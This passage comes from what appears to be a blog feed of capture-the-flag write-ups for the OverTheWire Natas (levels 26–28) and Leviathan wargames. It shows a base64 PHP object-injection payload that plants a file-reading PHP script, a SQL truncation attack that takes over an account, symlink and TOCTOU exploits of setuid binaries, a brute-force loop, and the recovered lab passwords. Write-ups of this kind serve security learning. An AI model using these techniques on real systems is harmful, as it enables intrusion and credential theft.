<li>serialized:</li>
</ul>


<p><code>plain
O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";}
</code></p>

<ul>
<li>base64 encoded:</li>
</ul>


<p><code>plain
Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=
</code></p>

<p>In my Logger class I just removed what wasn&rsquo;t necessary from the original code, and made the modifications so that the script will create a PHP file inside the <em>img/</em> directory, with this code inside it:</p>

<p><code>php
&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;
</code></p>

<p>And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p>

<p>Because I used <em>readfile()</em>, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that <em>file_get_contents()</em> is a better choice for reading a file into a string, but I was too lazy to change it!</p>

<blockquote><p>file_get_contents() is the preferred way to read the contents of a file into a string.</p></blockquote>

<p>Helpful resources:</p>

<p><a href="https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize">PHP serialization</a></p>

<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a></p>

<p><a href="https://www.notsosecure.com/2015/09/24/remote-code-execution-via-php-unserialize/">RCE with PHP unserialize</a></p>

<p><a href="https://vagosec.org/2013/09/wordpress-php-object-injection/">PHP object injection</a></p>

<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">unserialize() exploitation</a></p>

<h3>Level 27</h3>

<p><img class="center" src="/images/overthewire/natas/natas14.png" title="&lsquo;natas27&rsquo; &lsquo;natas 27&rsquo;" ></p>

<p>``` php
&lt;?</p>

<p>// morla / 10111
// database gets cleared every 5 min</p>

<p>/<em>
CREATE TABLE <code>users</code> (
  <code>username</code> varchar(64) DEFAULT NULL,
  <code>password</code> varchar(64) DEFAULT NULL
);
</em>/</p>

<p>function checkCredentials($link,$usr,$pass){</p>

<pre><code>$user=mysql_real_escape_string($usr);
$password=mysql_real_escape_string($pass);

$query = "SELECT username from users where username='$user' and password='$password' ";
$res = mysql_query($query, $link);
if(mysql_num_rows($res) &gt; 0){
    return True;
}
return False;
</code></pre>

<p>}</p>

<p>function validUser($link,$usr){</p>

<pre><code>$user=mysql_real_escape_string($usr);

$query = "SELECT * from users where username='$user'";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) &gt; 0) {
        return True;
    }
}
return False;
</code></pre>

<p>}</p>

<p>function dumpData($link,$usr){</p>

<pre><code>$user=mysql_real_escape_string($usr);

$query = "SELECT * from users where username='$user'";
$res = mysql_query($query, $link);
if($res) {
    if(mysql_num_rows($res) &gt; 0) {
        while ($row = mysql_fetch_assoc($res)) {
            //thanks to Gobo for reporting this bug!
            //return print_r($row);
            return print_r($row,true);
        }
    }
}
return False;
</code></pre>

<p>}</p>

<p>function createUser($link, $usr, $pass){</p>

<pre><code>$user=mysql_real_escape_string($usr);
$password=mysql_real_escape_string($pass);

$query = "INSERT INTO users (username,password) values ('$user','$password')";
$res = mysql_query($query, $link);
if(mysql_affected_rows() &gt; 0){
    return True;
}
return False;
</code></pre>

<p>}</p>

<p>if(array_key_exists(&ldquo;username&rdquo;, $<em>REQUEST) and array_key_exists(&ldquo;password&rdquo;, $</em>REQUEST)) {</p>

<pre><code>$link = mysql_connect('localhost', 'natas27', '&lt;censored&gt;');
mysql_select_db('natas27', $link);


if(validUser($link,$_REQUEST["username"])) {
    //user exists, check creds
    if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){
        echo "Welcome " . htmlentities($_REQUEST["username"]) . "!&lt;br&gt;";
        echo "Here is your data:&lt;br&gt;";
        $data=dumpData($link,$_REQUEST["username"]);
        print htmlentities($data);
    }
    else{
        echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "&lt;br&gt;";
    }        
} 
else {
    //user doesn't exist
    if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){ 
        echo "User " . htmlentities($_REQUEST["username"]) . " was created!";
    }
}

mysql_close($link);
</code></pre>

<p>} else {
?>
```</p>

<p>Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:</p>

<p><code>plain
 Welcome haxor!
Here is your data:
Array ( [username] =&gt; haxor [password] =&gt; doge )
</code></p>

<p>I then tried to create a natas28 user to see what would happen&hellip;and surprise!</p>

<p><code>plain
Wrong password for user: natas28
</code></p>

<p>This tells us that there is indeed such a user in the database and that our random password doesn&rsquo;t match the one stored in the database..so that&rsquo;s what we want to get! I&rsquo;ve tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)</p>

<ul>
<li><p><em>checkCredentials()</em> checks if the provided username and password (which are both escaped) exist in the table, returning True if they are</p></li>
<li><p><em>validUser()</em> checks if the username is already in the table</p></li>
<li><p><em>dumpData()</em> prints the data about the array containing the username and password as seen above in the log in message</p></li>
<li><p><em>createUser()</em> inserts a new username-password pair in the table</p></li>
</ul>


<p>The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn&rsquo;t exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:</p>

<p>1) when giving a username that already exists, it continues to the credentials checking part</p>

<p>2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)</p>

<p>Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the <em>dumpData()</em> one (because it returns data from the database, so it&rsquo;s possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18.</p>

<p>I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:</p>

<p><code>python
user = 'natas28' + ' ' * 64 + 'end'
print user
'natas28                                                                end'
</code></p>

<p>And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:</p>

<p><code>plain
Welcome yo!
Here is your data:
Array ( [username] =&gt; yo [password] =&gt; )
</code></p>

<p>Now I tried to create a user with that long string and yeah, the space is removed:</p>

<p><code>plain
User natas28 end was created!
</code></p>

<p>However, when next I tried to log in just as natas28 with no password, here is what awaited me!</p>

<p><code>plain
Welcome natas28!
Here is your data:
Array ( [username] =&gt; natas28 [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF )
</code></p>

<p>Why was this possible? Remember the flow of the code when you try to log in:</p>

<p>``` plain
validUser()</p>

<pre><code>if user exists, checkCredentials()
    if yay here is your data
    if nay wrong password message
else createUser()
</code></pre>

<p>```</p>

<p>To confirm it, I used <a href="http://sqlfiddle.com/">sqlfiddle</a> to generate a database and queries that mimic the PHP code.</p>

<p>First, table creation:</p>

<p><code>sql
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
</code></p>

<p>Then, inserting the natas28 user with the password (I used a dummy one but assume it&rsquo;s the one we&rsquo;re after):</p>

<p><code>sql
INSERT INTO users (username,password) values ('natas28','omgpass');
</code></p>

<p>Next, the querying for the username as it happens in the validUser() function:</p>

<p><code>sql
SELECT * from users where username='natas28';
</code></p>

<p>And the result:</p>

<p><img class="center" src="/images/overthewire/natas/sqlfiddle.png" title="&lsquo;sqlfiddle&rsquo; &lsquo;sqlfiddle&rsquo;" ></p>

<p>When trying to insert the long string next I received a data truncation error because it was larger than the allowed 64 characters, so I manually adjusted it to natas28 + 57 spaces:</p>

<p><code>plain
'natas28                                                         '
</code></p>

<p>Then I added it to the table:</p>

<p><code>sql
INSERT INTO users (username,password) values ('natas28                                                         ', '');
</code></p>

<p>And when querying the database both are returned (with the first being the original natas28 user):</p>

<p><img class="center" src="/images/overthewire/natas/sqlfiddle2.png" title="&lsquo;sqlfiddle2&rsquo; &lsquo;sqlfiddle2&rsquo;" ></p>

<p>To summarize:</p>

<p>``` plain</p>

<h1>with input of &lsquo;natas28                                                                end&rsquo;</h1>

<p>validUser()</p>

<pre><code>long string is truncated to natas28 end, which doesn't exist in the table
</code></pre>

<p>createUser()</p>

<pre><code># input becomes 'natas28                                                         '
the value that is inserted in the table is truncated to the max length, in this case natas28 + 57 spaces
</code></pre>

<h1>now check again with username of natas28 and no password</h1>

<p>validUser()</p>

<pre><code>username already exists, so checkCredentials()
with the space trimming, the code returns both the original and my inserted username, as seen on sqlfiddle (but due to the PHP code, we only get the first row, which is fine, because that's the one we care about
</code></pre>

<p>```</p>

<p>Password is <code>JWwR438wkgTsNKBbcJoowyysdM82YjeF</code></p>

<h3>Level 28</h3>

<p>And it&rsquo;s finished for now! Awesome challenge!</p>

<p><img class="center" src="/images/overthewire/natas/gz.png" title="&lsquo;gz&rsquo; &lsquo;gz&rsquo;" ></p>

<p>``` plain</p>

<hr />

<p>&lt; You will triumph over your enemy. ></p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Leviathan]]></title>
    <link href="http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan/"/>
    <updated>2015-07-30T10:01:22-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/07/30/overthewire-leviathan</id>
    <content type="html"><![CDATA[<p>The next step in difficulty for the OverTheWire wargames is Leviathan. From the description:</p>

<blockquote><p>This wargame doesn&rsquo;t require any knowledge about programming &ndash; just a bit of common sense and some knowledge about basic *nix commands.</p></blockquote>

<p>Leviathan’s levels are called leviathan0, leviathan1, … etc. and can be accessed on <strong>leviathan.labs.overthewire.org</strong> through SSH.</p>

<p>To login to the first level use:</p>

<p>Username: leviathan0</p>

<p>Password: leviathan0</p>

<p>Data for the levels can be found in the homedirectories.</p>

<!-- more -->


<h3>Level 0 &ndash;> Level 1</h3>

<p>There is no information about what you have to do for each level to progress, so you just have to look around.</p>

<p>If you do a <em>ls -la</em> in the home directory, you will see an interesting hidden directory owned by leviathan1:</p>

<p><code>plain
leviathan0@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root       root       4096 Nov 14  2014 .
drwxr-xr-x 167 root       root       4096 Jul  9 16:27 ..
drwxr-x---   2 leviathan1 leviathan0 4096 Jul 17 16:44 .backup
-rw-r--r--   1 root       root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root       root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root       root        675 Apr  9  2014 .profile
</code></p>

<p>Inside there is a bookmarks.html file with lots of links, so I tried grepping for the word password and wasn&rsquo;t disappointed:</p>

<p><code>plain
leviathan0@melinda:~/.backup$ cat bookmarks.html  | grep password
&lt;DT&gt;&lt;A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71"&gt;password to leviathan1&lt;/A&gt;
</code></p>

<h3>Level 1 &ndash;> Level 2</h3>

<p>There is a setuid binary in the home folder that asks for a password. Running <em>strings</em> on it didn&rsquo;t reveal much, except that it uses <em>strcmp</em>..so it compares the input it receives with something..</p>

<p>I solved this by running <em>ltrace</em> on the binary. <em>ltrace</em> is a library call tracer:</p>

<blockquote><p>ltrace  is  a  program  that simply runs the specified command until it
exits.  It intercepts and records the dynamic library calls  which  are
called  by  the  executed process and the signals which are received by
 that process.  It can also intercept and print the  system  calls  executed by the program.</p></blockquote>

<p><code>plain
leviathan1@melinda:~$ ltrace ./check
__libc_start_main(0x804852d, 1, 0xffffd7a4, 0x80485f0 &lt;unfinished ...&gt;
printf("password: ")                                                                        = 10
getchar(0x8048680, 47, 0x804a000, 0x8048642password: abcd
)                                                = 97
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 98
getchar(0x8048680, 47, 0x804a000, 0x8048642)                                                = 99
strcmp("abc", "sex")                                                                        = -1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                        = 29
+++ exited (status 0) +++
</code></p>

<p>In the <em>ltrace</em> output you can actually see the password that your input is compared with. Give it to the program and you will get a shell as leviathan2:</p>

<p><code>plain
leviathan1@melinda:~$ ./check
password: sex
$ whoami
leviathan2
</code></p>

<p>As in the previous wargame, look in <em>/etc/</em> for the password:</p>

<p><code>plain
$ cat /etc/leviathan_pass/leviathan2
ougahZi8Ta
</code></p>

<h3>Level 2 &ndash;> Level 3</h3>

<p>In this level we have another setuid binary named printfile. If you try to read the password file for the next level you just get a message that you an&rsquo;t have that file:</p>

<p><code>plain
leviathan2@melinda:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
</code></p>

<p>Running <em>ltrace</em> again we see the <em>access</em> system call is being used:</p>

<p><code>plain
leviathan2@melinda:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3   
__libc_start_main(0x804852d, 2, 0xffffd774, 0x8048600 &lt;unfinished ...&gt;
access("/etc/leviathan_pass/leviathan3", 4)                                                 = -1
puts("You cant have that file..."You cant have that file...
)                                                          = 27
+++ exited (status 1) +++
</code></p>

<p>This is good news, because <em>access</em> is vulnerable to race conditions, as can be seen from its man page:</p>

<blockquote><p>access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.</p>

<p>The check is done using the calling process&rsquo;s real UID and GID,  rather than the effective IDs as is done when actually attempting an operation
(e.g., open(2)) on the file.  This allows set-user-ID programs to  easily determine the invoking user&rsquo;s authority.</p>

<p>Warning: Using access() to check if a user is authorized to, for  example, open a file before actually doing so using open(2) creates a security
hole, because the user  might  exploit  the  short  time  interval between  checking and opening the file to manipulate it. For this reason, the   > use of this system call should be avoided.</p></blockquote>

<p>A more detailed description from <a href="https://www.owasp.org/index.php/File_Access_Race_Condition:_TOCTOU">OWASP</a>:</p>

<blockquote><p>The window of time between when a file property is checked and when the file is used can be exploited to launch a privilege escalation attack.</p>

<p>File access race conditions, known as time-of-check, time-of-use (TOCTOU) race conditions, occur when:</p>

<p>The program checks a property of a file, referencing the file by name.
The program later performs a filesystem operation using the same filename and assumes that the previously-checked property still holds.</p></blockquote>

<p>The first thing I thought was to create a file and make it a symlink to the password file, but it didn&rsquo;t work. So I just made a random file for test purposes and used <em>ltrace</em> again to see what is happening when accessing it:</p>

<p><code>plain
leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/readme
__libc_start_main(0x804852d, 2, 0xffffd784, 0x8048600 &lt;unfinished ...&gt;
access("/tmp/baka/readme", 4)                                                               = 0
snprintf("/bin/cat /tmp/baka/readme", 511, "/bin/cat %s", "/tmp/baka/readme")               = 25
system("/bin/cat /tmp/baka/readme"test
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                      = 0
+++ exited (status 0) +++
</code></p>

<p>I have to say, I used help for this one, because it wasn&rsquo;t clear to me on how to proceed (it&rsquo;s also where I got stuck when I first attempted this wargame). If <em>access</em> returns successfully, it will <em>cat</em> the file that was passed to it (and it&rsquo;s actually <em>snprintf</em> that does the <em>cat</em>. Remember from Bandit how <em>cat</em> won&rsquo;t print files with spaces in their names, unless the spaces are escaped or the filename is surrounded by quotes. I made a new dummy file with a space in its name:</p>

<p><code>plain
leviathan2@melinda:/tmp/baka$ cat space\ file
test
leviathan2@melinda:/tmp/baka$ cat space file
cat: space: No such file or directory
cat: file: No such file or directory
</code></p>

<p>Now I ran <em>ltrace</em> again and tried to print this new file:</p>

<p><code>plain
leviathan2@melinda:~$ ltrace ./printfile /tmp/baka/space\ file
__libc_start_main(0x804852d, 2, 0xffffd764, 0x8048600 &lt;unfinished ...&gt;
access("/tmp/baka/space file", 4)                                                           = 0
snprintf("/bin/cat /tmp/baka/space file", 511, "/bin/cat %s", "/tmp/baka/space file")       = 29
system("/bin/cat /tmp/baka/space file"/bin/cat: /tmp/baka/space: No such file or directory
/bin/cat: file: No such file or directory
 &lt;no return ...&gt;
--- SIGCHLD (Child exited) ---
&lt;... system resumed&gt; )                                                                      = 256
+++ exited (status 0) +++
</code></p>

<p>There is a discrepancy between <em>access</em>, which checks the path of the file, and what <em>cat</em> tries to print, two different files that don&rsquo;t exist, <em>space</em> and <em>file</em> (because the space isn&rsquo;t seen as part of the filename, but as a separator between arguments):</p>

<ul>
<li><p><em>cat</em> tries /tmp/baka/space</p></li>
<li><p><em>cat</em> tries file</p></li>
</ul>


<p>This is where the symbolic link exploitation part comes in place. It didn&rsquo;t work before, but if I now create a symlink to the password file and name it <em>space</em>, it will match the first half of the file that <em>cat</em> will try to print:</p>

<p><code>plain
leviathan2@melinda:/tmp/baka$ ls -l
total 8
-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 12:18 readme
lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 31 15:45 space -&gt; /etc/leviathan_pass/leviathan3
-rw-rw-r-- 1 leviathan2 leviathan2  5 Jul 31 15:01 space file
</code></p>

<p>And now I run <em>printfile</em> again:</p>

<p><code>plain
leviathan2@melinda:~$ ./printfile /tmp/baka/'space file'
Ahdiemoo1j
/bin/cat: file: No such file or directory
</code></p>

<p>Yay! It worked! Because <em>cat</em> first tried to print <em>space</em>, it followed the symlink with the same name and printed the password!</p>

<h3>Level 3 &ndash;> Level 4</h3>

<p>And another setuid binary! Running <em>strings</em> on it revealed it&rsquo;s a program that gives you a shell if you enter the right password. Along with string names such as do_stuff, nothing and morenothing xD</p>

<p><em>ltrace</em> keeps helping a lot with these challenges:</p>

<p><code>plain
leviathan3@melinda:~$ ltrace ./level3
__libc_start_main(0x80485fe, 1, 0xffffd794, 0x80486d0 &lt;unfinished ...&gt;
strcmp("h0no33", "kakaka")                                                                  = -1
printf("Enter the password&gt; ")                                                              = 20
fgets(Enter the password&gt; huh
"huh\n", 256, 0xf7fcac20)                                                             = 0xffffd58c
strcmp("huh\n", "snlprintf\n")                                                              = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                  = 19
+++ exited (status 0) +++
</code></p>

<p>The first <em>strcmp</em> doesn&rsquo;t seem to be used for anything, but the second one is interesting. It compares the given input with..snlprintf?! There is no such function in the C library, so I assumed it&rsquo;s just a string..and:</p>

<p><code>plain
leviathan3@melinda:~$ ./level3
Enter the password&gt; snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
</code></p>

<p>Awesome! On to the next level!</p>

<h3>Level 4 &ndash;> Level 5</h3>

<p>There is a hidden directory in the home folder:</p>

<p><code>plain
leviathan4@melinda:~$ ls -la
total 24
drwxr-xr-x   3 root root       4096 Nov 14  2014 .
drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
-rw-r--r--   1 root root        675 Apr  9  2014 .profile
dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash
</code></p>

<p>Inside there&rsquo;s a program that gives some binary output when run:</p>

<p><code>plain
leviathan4@melinda:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
</code></p>

<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>

<h3>Level 5 &ndash;> Level 6</h3>

<p>Another binary! If you run it, it says it can&rsquo;t find a file:</p>

<p><code>plain
leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log
</code></p>

<p>This is a setuid binary, so maybe we can trick it into reading the password file for the leviathan5 user. I made a symlink to the password file with the name of the missing file, and the binary followed it right to the password:</p>

<p><code>plain
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5
UgaoFee4li
</code></p>

<h3>Level 6 &ndash;> Level 7</h3>

<p>And yet another binary! This one asks for a 4-digit code:</p>

<p><code>plain
leviathan6@melinda:~$ ./leviathan6
usage: ./leviathan6 &lt;4 digit code&gt;
</code></p>

<p>Lookint at the strings, it seems this program will give us a shell if we can find the right code. I was going to use Python again but I found a quick and easy way to bruteforce the code with a very small Bash script:</p>

<p>``` bash</p>

<h1>!/bin/bash</h1>

<p>for i in {0000..9999}
do
echo &lsquo;Trying&rsquo; $i
~/leviathan6 $i
done
```</p>

<p>This script iterates over the range of possible codes and tries each of them as input for the leviathan6 binary:</p>

<p><code>plain
...
Trying 7122
Wrong
Trying 7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
</code></p>

<h3>Level 7 &ndash;> Level 8</h3>

<p>This is the final level, as you can see from the congratulatory note:</p>

<p><code>plain
leviathan7@melinda:~$ ls
CONGRATULATIONS
leviathan7@melinda:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
</code></p>

<p>Better skip over that last line&hellip;</p>

<p>``` plain</p>

<hr />

<p>/ Tomorrow will be cancelled due to lack \
\ of interest.                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
</feed>
